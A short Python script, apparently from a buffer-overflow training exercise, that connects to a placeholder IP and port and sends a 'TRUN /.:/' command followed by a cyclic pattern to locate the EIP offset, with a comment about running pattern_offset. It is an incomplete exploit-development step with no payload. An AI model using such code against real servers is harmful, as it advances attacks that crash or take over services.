#!/usr/bin/python

import sys,socket

offset = "" #Use the pattern_create module

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect(('IP',port))
                            s.send (('TRUN /.:/' + offset))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
                            
'''After finding the EIP value, run the command:

./pattern_offset -l <fuzz_num> -q <value_found>'''
